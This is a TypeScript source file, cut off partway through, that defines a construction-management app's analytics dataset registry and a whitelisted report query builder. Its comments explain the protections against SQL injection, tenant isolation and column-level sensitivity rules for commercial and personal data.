import {
  and,
  asc,
  desc,
  eq,
  gt,
  gte,
  ilike,
  inArray,
  isNotNull,
  isNull,
  lt,
  lte,
  ne,
  sql,
  type SQL,
} from "drizzle-orm";
import type { AnyPgColumn, PgTable } from "drizzle-orm/pg-core";
import {
  dailyLogs,
  delayEvents,
  disbursements,
  grievances,
  paymentClaims,
  punchItems,
  rfis,
  risks,
  signals,
  submittals,
  users,
  variations,
  vendors,
  workers,
} from "@constructos/db";
import {
  DELAY_CAUSES,
  DELAY_EVENT_STATUSES,
  DISBURSEMENT_STATUSES,
  GRIEVANCE_CHANNELS,
  GRIEVANCE_SEVERITIES,
  GRIEVANCE_STATUSES,
  PAYMENT_CLAIM_STATUSES,
  PAYMENT_REGIMES,
  PUNCH_STATUSES,
  REPORT_AGGREGATIONS,
  REPORT_DATASETS,
  REPORT_FILTER_OPERATORS,
  RFI_STATUSES,
  RISK_CATEGORIES,
  RISK_STATUSES,
  SIGNAL_DISPOSITIONS,
  SIGNAL_SEVERITIES,
  SUBMITTAL_RESPONSES,
  SUBMITTAL_STATUSES,
  SUBMITTAL_TYPES,
  VARIATION_BASES,
  VARIATION_STATUSES,
  WORKER_STATUSES,
  meetsLevel,
  type ColumnSensitivity,
  type PermissionLevel,
  type ReportAggregation,
  type ReportDataset,
  type ReportFilterOperator,
  type ToolKey,
} from "@constructos/shared";
import { badRequest, forbidden } from "../../lib/errors.js";
import type { Db } from "../../lib/db.js";

/**
 * Analytics dataset registry + whitelisted query builder — spec Vol I §6.1-6.2
 * (#731-734, #738-739, #751).
 *
 * THE SECURITY MODEL, stated plainly: a report definition is user input. It
 * names a dataset, columns, filter fields, a group-by field, aggregation
 * fields and a sort field — all of which are *identifiers*, and identifiers
 * cannot be parameterized in SQL. So none of them are ever taken from the
 * user. Every name in a definition is a KEY LOOKED UP IN THIS REGISTRY; the
 * lookup either resolves to a drizzle column object defined here in code, or
 * the request is rejected with 400. No user-supplied string is ever
 * concatenated or interpolated into SQL text — not as a column, not as a
 * table, not as an alias (aliases are additionally constrained to
 * `[A-Za-z][A-Za-z0-9_]*`). Filter *values* are bound as parameters by
 * drizzle, coerced first to the registered column's type.
 *
 * Tenancy is likewise not negotiable: `executeReport` appends the company
 * predicate (and the project predicate when the run is project-scoped) to
 * every query AFTER the definition's own filters, from the caller's request
 * context — never from the stored definition. A definition that filters on
 * some other tenant's id simply returns nothing, because its filter is ANDed
 * beneath the scope predicate rather than replacing it (#751, row-level
 * security).
 */

/* ------------------------------------------------------------------ */
/* Registry types                                                      */
/* ------------------------------------------------------------------ */

export type ReportColumnType = "string" | "number" | "date" | "enum";

/**
 * A whitelisted foreign-key lookup. `assigneeId` is an opaque id in a report
 * and a person's name in a conversation, so a column may declare which
 * reference table resolves it. The join is NOT expressed in SQL: the ids of
 * the returned page (at most `pageSize` of them) are resolved in one bounded
 * `IN` query per lookup after the rows come back, which keeps the query plan
 * unchanged and cannot widen the tenancy predicate.
 */
export type LookupKey = "user" | "vendor";

export interface DatasetColumnDef {
  label: string;
  /** the drizzle column — the ONLY way a column ever reaches SQL */
  column: AnyPgColumn;
  type: ReportColumnType;
  /** closed vocabulary for `enum` columns; eq/ne/in values are checked against it */
  enumValues?: readonly string[];
  filterable: boolean;
  groupable: boolean;
  /** supports sum/avg/min/max. `count` is available on every column. */
  aggregatable: boolean;
  /**
   * WHO MAY SEE THIS COLUMN (#751). `public` is operational metadata,
   * `commercial` is money and terms, `pii` is a person. See
   * COLUMN_SENSITIVITIES in enums-analytics.ts for the rule each class buys.
   */
  sensitivity: ColumnSensitivity;
  /** resolve this id to a display name from a whitelisted reference table */
  lookup?: LookupKey;
}

export interface DatasetDef {
  key: ReportDataset;
  label: string;
  description: string;
  table: PgTable;
  /**
   * THE TOOL THAT GOVERNS THIS DATASET. Analytics must never be a wider door
   * than the module it reports on: a caller reads a dataset only on projects
   * where they hold at least `read` on this tool, and sees its commercial and
   * pii columns only where they hold `standard`. The map is the whole of the
   * fix for "any project member could report on workers, payment claims,
   * disbursements, variations and signals".
   */
  tool: ToolKey;
  /** project = rows belong to a project; company = rows are company-level */
  scope: "project" | "company";
  companyColumn: AnyPgColumn;
  /** null only for datasets with no project dimension at all */
  projectColumn: AnyPgColumn | null;
  /** column key used when a definition names no sort */
  defaultSort: string;
  columns: Record<string, DatasetColumnDef>;
}

/* ------------------------------------------------------------------ */
/* Column constructors (keep the registry legible)                     */
/* ------------------------------------------------------------------ */

const str = (
  label: string,
  column: AnyPgColumn,
  groupable = false,
  sensitivity: ColumnSensitivity = "public",
): DatasetColumnDef => ({
  label,
  column,
  type: "string",
  filterable: true,
  groupable,
  aggregatable: false,
  sensitivity,
});

/** A free-text column authored by a person about a person. */
const pii = (label: string, column: AnyPgColumn, groupable = false): DatasetColumnDef =>
  str(label, column, groupable, "pii");

/** identifier-ish column: filterable and countable, never grouped or summed */
const idc = (label: string, column: AnyPgColumn): DatasetColumnDef => ({
  label,
  column,
  type: "string",
  filterable: true,
  groupable: false,
  aggregatable: false,
  sensitivity: "public",
});

/** person/party reference — grouping by owner is a first-class report shape */
const ref = (
  label: string,
  column: AnyPgColumn,
  lookup?: LookupKey,
): DatasetColumnDef => ({
  label,
  column,
  type: "string",
  filterable: true,
  groupable: true,
  aggregatable: false,
  sensitivity: "public",
  ...(lookup ? { lookup } : {}),
});

const num = (
  label: string,
  column: AnyPgColumn,
  sensitivity: ColumnSensitivity = "public",
): DatasetColumnDef => ({
  label,
  column,
  type: "number",
  filterable: true,
  groupable: false,
  aggregatable: true,
  sensitivity,
});

/** A money or commercial-terms column. */
const money = (label: string, column: AnyPgColumn): DatasetColumnDef =>
  num(label, column, "commercial");

const dat = (label: string, column: AnyPgColumn): DatasetColumnDef => ({
  label,
  column,
  type: "date",
  filterable: true,
  groupable: false,
  aggregatable: true,
  sensitivity: "public",
});

const enm = (
  label: string,
  column: AnyPgColumn,
  enumValues: readonly string[],
  sensitivity: ColumnSensitivity = "public",
): DatasetColumnDef => ({
  label,
  column,
  type: "enum",
  enumValues,
  filterable: true,
  groupable: true,
  aggregatable: false,
  sensitivity,
});

/** 0/1 integer flag — numeric so values coerce correctly, but groupable. */
const flag = (label: string, column: AnyPgColumn): DatasetColumnDef => ({
  label,
  column,
  type: "number",
  filterable: true,
  groupable: true,
  aggregatable: true,
  sensitivity: "public",
});

/**
 * Column-level vocabularies that live on the column comment rather than in
 * @constructos/shared. Repeated here so the builder can offer them; kept in
 * sync by the registry-integrity test, which asserts every enum column has a
 * non-empty vocabulary.
 */
const IMPACT_FLAGS = ["yes", "no", "tbd"] as const;
const PRIORITIES = ["low", "medium", "high"] as const;
const DAILY_LOG_STATUSES = ["draft", "submitted", "approved"] as const;

/* ------------------------------------------------------------------ */
/* The registry — 12 datasets (REPORT_DATASETS)                        */
/* ------------------------------------------------------------------ */

export const DATASETS: Record<ReportDataset, DatasetDef> = {
  rfis: {
    key: "rfis",
    tool: "rfis",
    label: "RFIs",
    description: "Requests for information, their ball-in-court and response state.",
    table: rfis,
    scope: "project",
    companyColumn: rfis.companyId,
    projectColumn: rfis.projectId,
    defaultSort: "createdAt",
    columns: {
      id: idc("RFI id", rfis.id),
      number: num("Number", rfis.number),
      subject: str("Subject", rfis.subject),
      status: enm("Status", rfis.status, RFI_STATUSES),
      assigneeId: ref("Assignee", rfis.assigneeId, "user"),
      ballInCourtId: ref("Ball in court", rfis.ballInCourtId, "user"),
      dueDate: dat("Due date", rfis.dueDate),
      costImpact: enm("Cost impact", rfis.costImpact, IMPACT_FLAGS),
      scheduleImpactDays: num("Schedule impact (days)", rfis.scheduleImpactDays),
      respondedAt: dat("Responded at", rfis.respondedAt),
      createdAt: dat("Created at", rfis.createdAt),
    },
  },

  submittals: {
    key: "submittals",
    tool: "submittals",
    label: "Submittals",
    description: "Submittal register with lead times and reviewer response codes.",
    table: submittals,
    scope: "project",
    companyColumn: submittals.companyId,
    projectColumn: submittals.projectId,
    defaultSort: "createdAt",
    columns: {
      id: idc("Submittal id", submittals.id),
      number: num("Number", submittals.number),
      revision: num("Revision", submittals.revision),
      title: str("Title", submittals.title),
      status: enm("Status", submittals.status, SUBMITTAL_STATUSES),
      submittalType: enm("Type", submittals.submittalType, SUBMITTAL_TYPES),
      responseCode: enm("Response code", submittals.responseCode, SUBMITTAL_RESPONSES),
      specSection: str("Spec section", submittals.specSection, true),
      ballInCourtId: ref("Ball in court", submittals.ballInCourtId, "user"),
      requiredOnSite: dat("Required on site", submittals.requiredOnSite),
      leadTimeDays: num("Lead time (days)", submittals.leadTimeDays),
      createdAt: dat("Created at", submittals.createdAt),
    },
  },

  punch_items: {
    key: "punch_items",
    tool: "punch",
    label: "Punch items",
    description: "Snag / punch list with assignment, priority and closure state.",
    table: punchItems,
    scope: "project",
    companyColumn: punchItems.companyId,
    projectColumn: punchItems.projectId,
    defaultSort: "createdAt",
    columns: {
      id: idc("Punch item id", punchItems.id),
      number: num("Number", punchItems.number),
      title: str("Title", punchItems.title),
      status: enm("Status", punchItems.status, PUNCH_STATUSES),
      priority: enm("Priority", punchItems.priority, PRIORITIES),
      assigneeId: ref("Assignee", punchItems.assigneeId, "user"),
      vendorId: ref("Vendor", punchItems.vendorId, "vendor"),
      locationId: ref("Location", punchItems.locationId),
      dueDate: dat("Due date", punchItems.dueDate),
      createdAt: dat("Created at", punchItems.createdAt),
    },
  },

  daily_logs: {
    key: "daily_logs",
    tool: "daily_logs",
    label: "Daily logs",
    description: "Daily site records, their approval state and AI-drafted flag.",
    table: dailyLogs,
    scope: "project",
    companyColumn: dailyLogs.companyId,
    projectColumn: dailyLogs.projectId,
    defaultSort: "logDate",
    columns: {
      id: idc("Log id", dailyLogs.id),
      logDate: dat("Log date", dailyLogs.logDate),
      status: enm("Status", dailyLogs.status, DAILY_LOG_STATUSES),
      notes: str("Notes", dailyLogs.notes),
      aiDrafted: flag("AI drafted (0/1)", dailyLogs.aiDrafted),
      createdBy: ref("Created by", dailyLogs.createdBy, "user"),
      approvedBy: ref("Approved by", dailyLogs.approvedBy, "user"),
      createdAt: dat("Created at", dailyLogs.createdAt),
    },
  },

  delay_events: {
    key: "delay_events",
    tool: "forensics",
    label: "Delay events",
    description: "Delay register with cause, entitlement classification and duration.",
    table: delayEvents,
    scope: "project",
    companyColumn: delayEvents.companyId,
    projectColumn: delayEvents.projectId,
    defaultSort: "startDate",
    columns: {
      id: idc("Delay event id", delayEvents.id),
      number: num("Number", delayEvents.number),
      title: str("Title", delayEvents.title),
      cause: enm("Cause", delayEvents.cause, DELAY_CAUSES),
      status: enm("Status", delayEvents.status, DELAY_EVENT_STATUSES),
      excusable: flag("Excusable (0/1)", delayEvents.excusable),
      compensable: flag("Compensable (0/1)", delayEvents.compensable),
      startDate: dat("Start date", delayEvents.startDate),
      durationDays: num("Duration (days)", delayEvents.durationDays),
      raisedBy: ref("Raised by", delayEvents.raisedBy, "user"),
      createdAt: dat("Created at", delayEvents.createdAt),
    },
  },

  risks: {
    key: "risks",
    tool: "risk",
    label: "Risks",
    description: "Risk register with qualitative scoring and mitigation cost.",
    table: risks,
    scope: "project",
    companyColumn: risks.companyId,
    projectColumn: risks.projectId,
    defaultSort: "createdAt",
    columns: {
      id: idc("Risk id", risks.id),
      number: num("Number", risks.number),
      title: str("Title", risks.title),
      category: enm("Category", risks.category, RISK_CATEGORIES),
      status: enm("Status", risks.status, RISK_STATUSES),
      ownerId: ref("Owner", risks.ownerId, "user"),
      probabilityScore: num("Probability (1-5)", risks.probabilityScore),
      impactScore: num("Impact (1-5)", risks.impactScore),
      mitigationCost: money("Mitigation cost", risks.mitigationCost),
      createdAt: dat("Created at", risks.createdAt),
    },
  },

  signals: {
    key: "signals",
    tool: "assurance",
    label: "Assurance signals",
    description: "Detector output: severity, confidence and reviewer disposition.",
    table: signals,
    // rows carry a nullable projectId (company-level signals exist), so a
    // company-scoped run over this dataset returns both.
    scope: "project",
    companyColumn: signals.companyId,
    projectColumn: signals.projectId,
    defaultSort: "createdAt",
    columns: {
      id: idc("Signal id", signals.id),
      projectId: ref("Project", signals.projectId),
      detector: str("Detector", signals.detector, true),
      severity: enm("Severity", signals.severity, SIGNAL_SEVERITIES),
      confidence: num("Confidence", signals.confidence),
      title: str("Title", signals.title),
      disposition: enm("Disposition", signals.disposition, SIGNAL_DISPOSITIONS),
      reviewerId: ref("Reviewer", signals.reviewerId, "user"),
      createdAt: dat("Created at", signals.createdAt),
    },
  },

  payment_claims: {
    key: "payment_claims",
    tool: "payments",
    label: "Payment claims",
    description: "Statutory payment claims with the computed deadline timeline.",
    table: paymentClaims,
    scope: "project",
    companyColumn: paymentClaims.companyId,
    projectColumn: paymentClaims.projectId,
    defaultSort: "referenceDate",
    columns: {
      id: idc("Claim id", paymentClaims.id),
      number: num("Number", paymentClaims.number),
      regime: enm("Regime", paymentClaims.regime, PAYMENT_REGIMES),
      status: enm("Status", paymentClaims.status, PAYMENT_CLAIM_STATUSES),
      claimedAmount: money("Claimed amount", paymentClaims.claimedAmount),
      paidAmount: money("Paid amount", paymentClaims.paidAmount),
      currency: str("Currency", paymentClaims.currency, true),
      referenceDate: dat("Reference date", paymentClaims.referenceDate),
      responseDeadline: dat("Response deadline", paymentClaims.responseDeadline),
      finalPaymentDate: dat("Final payment date", paymentClaims.finalPaymentDate),
      createdAt: dat("Created at", paymentClaims.createdAt),
    },
  },

  variations: {
    key: "variations",
    tool: "commercial",
    label: "Variations",
    description: "Variation register: valuation basis, estimate, agreed value, time impact.",
    table: variations,
    scope: "project",
    companyColumn: variations.companyId,
    projectColumn: variations.projectId,
    defaultSort: "createdAt",
    columns: {
      id: idc("Variation id", variations.id),
      number: num("Number", variations.number),
      title: str("Title", variations.title),
      status: enm("Status", variations.status, VARIATION_STATUSES),
      basis: enm("Valuation basis", variations.basis, VARIATION_BASES),
      costEstimate: money("Cost estimate", variations.costEstimate),
      agreedValue: money("Agreed value", variations.agreedValue),
      timeImpactDays: num("Time impact (days)", variations.timeImpactDays),
      clauseRef: str("Clause reference", variations.clauseRef, true),
      instructedAt: dat("Instructed at", variations.instructedAt),
      createdAt: dat("Created at", variations.createdAt),
    },
  },

  disbursements: {
    key: "disbursements",
    tool: "finance",
    label: "Disbursements",
    description: "Lender drawdown requests and their approval / payment state.",
    table: disbursements,
    scope: "project",
    companyColumn: disbursements.companyId,
    projectColumn: disbursements.projectId,
    defaultSort: "createdAt",
    columns: {
      id: idc("Disbursement id", disbursements.id),
      number: num("Number", disbursements.number),
      facilityId: ref("Facility", disbursements.facilityId),
      categoryId: ref("Category", disbursements.categoryId),
      amount: money("Amount", disbursements.amount),
      status: enm("Status", disbursements.status, DISBURSEMENT_STATUSES),
      purpose: str("Purpose", disbursements.purpose, false, "commercial"),
      submittedAt: dat("Submitted at", disbursements.submittedAt),
      disbursedAt: dat("Disbursed at", disbursements.disbursedAt),
      createdAt: dat("Created at", disbursements.createdAt),
    },
  },

  grievances: {
    key: "grievances",
    tool: "land",
    label: "Grievances",
    description: "Community grievance log with SLA dates and closure verification.",
    table: grievances,
    scope: "project",
    companyColumn: grievances.companyId,
    projectColumn: grievances.projectId,
    defaultSort: "receivedAt",
    columns: {
      id: idc("Grievance id", grievances.id),
      number: num("Number", grievances.number),
      channel: enm("Channel", grievances.channel, GRIEVANCE_CHANNELS),
      category: str("Category", grievances.category, true, "pii"),
      severity: enm("Severity", grievances.severity, GRIEVANCE_SEVERITIES),
      status: enm("Status", grievances.status, GRIEVANCE_STATUSES),
      assigneeId: ref("Assignee", grievances.assigneeId, "user"),
      receivedAt: dat("Received at", grievances.receivedAt),
      resolveDueAt: dat("Resolve due at", grievances.resolveDueAt),
      resolvedAt: dat("Resolved at", grievances.resolvedAt),
      createdAt: dat("Created at", grievances.createdAt),
    },
  },

  workers: {
    key: "workers",
    tool: "workforce",
    label: "Workers",
    description:
      "Workforce register. Date of birth is deliberately NOT exposed — age " +
      "verification is a workforce-module function, not a reporting column.",
    table: workers,
    scope: "project",
    companyColumn: workers.companyId,
    projectColumn: workers.projectId,
    defaultSort: "createdAt",
    columns: {
      id: idc("Worker id", workers.id),
      reference: idc("Reference", workers.reference),
      fullName: pii("Full name", workers.fullName),
      nationality: pii("Nationality", workers.nationality, true),
      trade: str("Trade", workers.trade, true),
      vendorId: ref("Employer", workers.vendorId, "vendor"),
      status: enm("Status", workers.status, WORKER_STATUSES),
      agreedDailyRate: num("Agreed daily rate", workers.agreedDailyRate, "pii"),
      inductedAt: dat("Inducted at", workers.inductedAt),
      demobilisedAt: dat("Demobilised at", workers.demobilisedAt),
      createdAt: dat("Created at", workers.createdAt),
    },
  },
};

/* ------------------------------------------------------------------ */
/* Capability rules                                                    */
/* ------------------------------------------------------------------ */

const COMPARISON_OPERATORS: ReportFilterOperator[] = ["gt", "gte", "lt", "lte"];

/** Operators that make sense for a column of this type (drives the builder UI). */
export function operatorsForType(type: ReportColumnType): ReportFilterOperator[] {
  const base: ReportFilterOperator[] = ["eq", "ne", "in", "is_null", "not_null"];
  if (type === "enum") return base;
  if (type === "string") return [...base, "contains"];
  return [...base, ...COMPARISON_OPERATORS];
}

/** Aggregation functions valid for a column of this type. */
export function aggregationsForColumn(def: DatasetColumnDef): ReportAggregation[] {
  if (def.type === "number") return ["count", "sum", "avg", "min", "max"];
  if (def.aggregatable) return ["count", "min", "max"];
  return ["count"];
}

/** Aliases become SQL identifiers, so they are constrained rather than escaped. */
const ALIAS_RE = /^[A-Za-z][A-Za-z0-9_]{0,40}$/;

/* ------------------------------------------------------------------ */
/* Catalog (GET /analytics/datasets)                                   */
/* ------------------------------------------------------------------ */

export interface CatalogColumn {
  key: string;
  label: string;
  type: ReportColumnType;
  enumValues?: readonly string[];
  filterable: boolean;
  groupable: boolean;
  aggregatable: boolean;
  operators: ReportFilterOperator[];
  aggregations: ReportAggregation[];
  sensitivity: ColumnSensitivity;
  /** the level on the dataset's tool this column needs */
  requiresLevel: PermissionLevel;
  lookup?: LookupKey;
}

export interface CatalogDataset {
  key: ReportDataset;
  label: string;
  description: string;
  scope: "project" | "company";
  tool: ToolKey;
  defaultSort: string;
  columns: CatalogColumn[];
}

/** JSON-safe view of the registry — drizzle column objects never leave here. */
export function datasetCatalog(): CatalogDataset[] {
  return REPORT_DATASETS.map((key) => {
    const ds = DATASETS[key];
    return {
      key: ds.key,
      label: ds.label,
      description: ds.description,
      scope: ds.scope,
      tool: ds.tool,
      defaultSort: ds.defaultSort,
      columns: Object.entries(ds.columns).map(([colKey, def]) => ({
        key: colKey,
        label: def.label,
        type: def.type,
        ...(def.enumValues ? { enumValues: def.enumValues } : {}),
        filterable: def.filterable,
        groupable: def.groupable,
        aggregatable: def.aggregatable,
        operators: operatorsForType(def.type),
        aggregations: aggregationsForColumn(def),
        sensitivity: def.sensitivity,
        requiresLevel: levelForSensitivity(def.sensitivity),
        ...(def.lookup ? { lookup: def.lookup } : {}),
      })),
    };
  });
}

/* ------------------------------------------------------------------ */
/* Column sensitivity (#751)                                           */
/* ------------------------------------------------------------------ */

/**
 * The level on the dataset's governing tool a column of this class needs.
 *
 * `read` on `workforce` lets somebody open the workforce register and see that
 * there are 240 people on site; it does not let them export everybody's name,
 * nationality and daily rate. `standard` — the level that can EDIT those
 * records in the module — is the honest threshold for reading them in bulk
 * through a report, because a user who may change a figure may certainly read
 * it.
 */
export function levelForSensitivity(sensitivity: ColumnSensitivity): PermissionLevel {
  return sensitivity === "public" ? "read" : "standard";
}

/** Column keys of `ds` a caller at `level` on its tool may see. */
export function visibleColumnKeys(ds: DatasetDef, level: PermissionLevel): string[] {
  return Object.entries(ds.columns)
    .filter(([, def]) => meetsLevel(level, levelForSensitivity(def.sensitivity)))
    .map(([key]) => key);
}

export interface SensitivityOutcome {
  plan: ResolvedReport;
  /** projected columns removed because the caller may not see them */
  hiddenColumns: string[];
}

/**
 * Apply the caller's effective level to a resolved plan.
 *
 * PROJECTED columns the caller may not see are REMOVED and named, because a
 * silently blank column reads as "no data" rather than "not yours". A column
 * used to FILTER, GROUP, AGGREGATE or SORT is refused outright: `count(*)
 * where nationality = 'X'` discloses the very field the class protects, and a
 * report that quietly ignored the predicate would return the wrong number.
 */
export function applySensitivity(
  plan: ResolvedReport,
  level: PermissionLevel,
): SensitivityOutcome {
  const allowed = new Set(visibleColumnKeys(plan.dataset, level));
  const refuse = (role: string, key: string) => {
    const def = plan.dataset.columns[key]!;
    throw forbidden(
      `Field "${key}" is ${def.sensitivity} on dataset "${plan.dataset.key}" and cannot be used ` +
        `as a ${role}: that needs ${levelForSensitivity(def.sensitivity)} access to ` +
        `${plan.dataset.tool} on every project in scope.`,
    );
  };
  for (const f of plan.filters) if (!allowed.has(f.key)) refuse("filter", f.key);
  if (plan.groupBy && !allowed.has(plan.groupBy.key)) refuse("grouping", plan.groupBy.key);
  for (const a of plan.aggregations) if (!allowed.has(a.key)) refuse("aggregation", a.key);
  if (!plan.isAggregate && plan.sortBy && !allowed.has(plan.sortBy)) refuse("sort", plan.sortBy);

  const kept = plan.columns.filter((c) => allowed.has(c.key));
  const hiddenColumns = plan.columns.filter((c) => !allowed.has(c.key)).map((c) => c.key);
  if (hiddenColumns.length === 0) return { plan, hiddenColumns };
  if (kept.length === 0 && !plan.isAggregate) {
    throw forbidden(
      `Every column of this report is ${plan.dataset.tool} data you do not hold standard ` +
        "access to, so there is nothing to return.",
    );
  }
  return { plan: { ...plan, columns: kept }, hiddenColumns };
}

/* ------------------------------------------------------------------ */
/* Definition resolution (every identifier goes through here)          */
/* ------------------------------------------------------------------ */

export interface FilterInput {
  field: string;
  operator: ReportFilterOperator;
  value?: unknown;
}

export interface AggregationInput {
  field: string;
  fn: ReportAggregation;
  alias: string;
}

export interface ReportSpec {
  dataset: string;
  columns: string[];
  filters?: FilterInput[];
  groupBy?: string | null;
  aggregations?: AggregationInput[];
  sortBy?: string | null;
  sortDir?: string | null;
  limitRows: number;
}

interface ResolvedColumn {
  key: string;
  def: DatasetColumnDef;
}

interface ResolvedFilter {
  key: string;
  def: DatasetColumnDef;
  operator: ReportFilterOperator;
  value: unknown;
}

interface ResolvedAggregation {
  key: string;
  alias: string;
  fn: ReportAggregation;
  def: DatasetColumnDef;
}

export interface ResolvedReport {
  dataset: DatasetDef;
  columns: ResolvedColumn[];
  filters: ResolvedFilter[];
  groupBy: ResolvedColumn | null;
  aggregations: ResolvedAggregation[];
  /** column key (row mode) or column key / aggregation alias (group mode) */
  sortBy: string | null;
  sortDir: "asc" | "desc";
  limitRows: number;
  /** true when the query collapses rows (group-by and/or bare aggregates) */
  isAggregate: boolean;
}

export const MAX_LIMIT_ROWS = 5000;

function lookupDataset(key: string): DatasetDef {
  // Own-property check, not a bare index: `constructor`, `__proto__`,
  // `toString` &c. are inherited from Object.prototype and would otherwise
  // resolve to a truthy non-dataset and crash downstream.
  if (typeof key !== "string" || !Object.hasOwn(DATASETS, key)) {
    throw badRequest(`Unknown dataset "${String(key)}"`, { allowed: REPORT_DATASETS });
  }
  return DATASETS[key as ReportDataset];
}

function lookupColumn(ds: DatasetDef, key: unknown, role: string): ResolvedColumn {
  if (typeof key !== "string" || !Object.hasOwn(ds.columns, key)) {
    // The offending key is echoed back for the builder, never used in SQL.
    throw badRequest(`Unknown ${role} field "${String(key)}" for dataset "${ds.key}"`, {
      allowed: Object.keys(ds.columns),
    });
  }
  return { key, def: ds.columns[key]! };
}

/** ISO date or ISO timestamp — dates cross the wire as strings, always. */
function coerceDate(value: unknown, field: string): string {
  if (typeof value !== "string" || !/^\d{4}-\d{2}-\d{2}([T ].*)?$/.test(value)) {
    throw badRequest(`Filter on "${field}" expects an ISO date (YYYY-MM-DD)`);
  }
  if (Number.isNaN(Date.parse(value.length === 10 ? `${value}T00:00:00Z` : value))) {
    throw badRequest(`Filter on "${field}" has an unparseable date "${value}"`);
  }
  return value;
}

function coerceScalar(def: DatasetColumnDef, key: string, value: unknown): unknown {
  if (value === null || value === undefined) {
    throw badRequest(`Filter on "${key}" requires a value`);
  }
  switch (def.type) {
    case "number": {
      const n = Number(value);
      if (!Number.isFinite(n)) throw badRequest(`Filter on "${key}" expects a number`);
      return n;
    }
    case "date":
      return coerceDate(value, key);
    case "enum": {
      const s = String(value);
      if (def.enumValues && !def.enumValues.includes(s)) {
        throw badRequest(`Filter on "${key}" has value "${s}" outside its vocabulary`, {
          allowed: def.enumValues,
        });
      }
      return s;
    }
    default:
      if (typeof value === "object") throw badRequest(`Filter on "${key}" expects a string`);
      return String(value);
  }
}

function resolveFilter(ds: DatasetDef, raw: FilterInput): ResolvedFilter {
  const { key, def } = lookupColumn(ds, raw.field, "filter");
  if (!def.filterable) throw badRequest(`Field "${key}" is not filterable`);
  const operator = raw.operator;
  if (!REPORT_FILTER_OPERATORS.includes(operator)) {
    throw badRequest(`Unknown filter operator "${String(operator)}"`, {
      allowed: REPORT_FILTER_OPERATORS,
    });
  }
  if (!operatorsForType(def.type).includes(operator)) {
    throw badRequest(`Operator "${operator}" is not valid for ${def.type} field "${key}"`, {
      allowed: operatorsForType(def.type),
    });
  }
  if (operator === "is_null" || operator === "not_null") {
    return { key, def, operator, value: null };
  }
  if (operator === "in") {
    if (!Array.isArray(raw.value) || raw.value.length === 0) {
      throw badRequest(`Filter on "${key}" with operator "in" requires a non-empty array`);
    }
    if (raw.value.length > 200) {
      throw badRequest(`Filter on "${key}" with operator "in" accepts at most 200 values`);
    }
    return { key, def, operator, value: raw.value.map((v) => coerceScalar(def, key, v)) };
  }
  if (operator === "contains") {
    return { key, def, operator, value: String(raw.value ?? "") };
  }
  return { key, def, operator, value: coerceScalar(def, key, raw.value) };
}

/**
 * Turn a stored/posted definition into a resolved plan of drizzle objects.
 * Throws 400 on ANY key that does not resolve in the registry.
 */
export function resolveReport(spec: ReportSpec): ResolvedReport {
  const ds = lookupDataset(spec.dataset);

  if (!Array.isArray(spec.columns) || spec.columns.length === 0) {
    throw badRequest("A report must select at least one column");
  }
  const columns = spec.columns.map((c) => lookupColumn(ds, c, "column"));

  const filters = (spec.filters ?? []).map((f) => resolveFilter(ds, f));

  let groupBy: ResolvedColumn | null = null;
  if (spec.groupBy) {
    groupBy = lookupColumn(ds, spec.groupBy, "groupBy");
    if (!groupBy.def.groupable) throw badRequest(`Field "${groupBy.key}" is not groupable`);
  }

  const aliases = new Set<string>();
  const aggregations = (spec.aggregations ?? []).map((a) => {
    const { key, def } = lookupColumn(ds, a.field, "aggregation");
    if (!REPORT_AGGREGATIONS.includes(a.fn)) {
      throw badRequest(`Unknown aggregation "${String(a.fn)}"`, { allowed: REPORT_AGGREGATIONS });
    }
    if (!aggregationsForColumn(def).includes(a.fn)) {
      throw badRequest(`Aggregation "${a.fn}" is not valid for ${def.type} field "${key}"`, {
        allowed: aggregationsForColumn(def),
      });
    }
    const alias = a.alias;
    if (typeof alias !== "string" || !ALIAS_RE.test(alias)) {
      throw badRequest(
        `Aggregation alias "${String(alias)}" must match [A-Za-z][A-Za-z0-9_]{0,40}`,
      );
    }
    if (aliases.has(alias)) throw badRequest(`Duplicate aggregation alias "${alias}"`);
    aliases.add(alias);
    return { key, alias, fn: a.fn, def };
  });

  const isAggregate = aggregations.length > 0;
  if (groupBy && !isAggregate) {
    throw badRequest("groupBy requires at least one aggregation");
  }
  if (isAggregate && groupBy && aliases.has(groupBy.key)) {
    throw badRequest(`Aggregation alias "${groupBy.key}" collides with the groupBy column`);
  }

  let sortBy: string | null = null;
  const sortDir = spec.sortDir === "asc" ? "asc" : "desc";
  if (spec.sortBy) {
    if (isAggregate) {
      const ok = aliases.has(spec.sortBy) || (groupBy !== null && groupBy.key === spec.sortBy);
      if (!ok) {
        throw badRequest(
          `sortBy "${spec.sortBy}" must be the groupBy column or an aggregation alias`,
          { allowed: [...(groupBy ? [groupBy.key] : []), ...aliases] },
        );
      }
      sortBy = spec.sortBy;
    } else {
      sortBy = lookupColumn(ds, spec.sortBy, "sortBy").key;
    }
  }

  const limitRows = Math.trunc(Number(spec.limitRows));
  if (!Number.isFinite(limitRows) || limitRows < 1 || limitRows > MAX_LIMIT_ROWS) {
    throw badRequest(`limitRows must be between 1 and ${MAX_LIMIT_ROWS}`);
  }

  return {
    dataset: ds,
    columns,
    filters,
    groupBy,
    aggregations,
    sortBy,
    sortDir,
    limitRows,
    isAggregate,
  };
}

/* ------------------------------------------------------------------ */
/* Execution                                                           */
/* ------------------------------------------------------------------ */

/** Make a user value a LIKE literal (default backslash escape character). */
function escapeLikeLiteral(value: string): string {
  return value.replace(/[\\%_]/g, (c) => `\\${c}`);
}

function filterPredicate(f: ResolvedFilter): SQL {
  // `f.def.column` is a registry-owned drizzle column; `f.value` is bound as a
  // parameter by drizzle. Neither is string-concatenated into SQL.
  const col = f.def.column;
  const v = f.value as never;
  switch (f.operator) {
    case "eq":
      return eq(col, v);
    case "ne":
      return ne(col, v);
    case "gt":
      return gt(col, v);
    case "gte":
      return gte(col, v);
    case "lt":
      return lt(col, v);
    case "lte":
      return lte(col, v);
    case "contains":
      return ilike(col, `%${escapeLikeLiteral(String(f.value))}%`);
    case "in":
      return inArray(col, f.value as never[]);
    case "is_null":
      return isNull(col);
    case "not_null":
      return isNotNull(col);
  }
}

function aggregateExpression(a: ResolvedAggregation): SQL {
  const c = a.def.column;
  switch (a.fn) {
    case "count":
      return sql`count(${c})::int`;
    case "sum":
      return sql`coalesce(sum(${c}), 0)::double precision`;
    case "avg":
      return sql`avg(${c})::double precision`;
    case "min":
      return a.def.type === "number" ? sql`min(${c})::double precision` : sql`min(${c})::text`;
    case "max":
      return a.def.type === "number" ? sql`max(${c})::double precision` : sql`max(${c})::text`;
  }
}

function aggregateLabel(a: ResolvedAggregation): string {
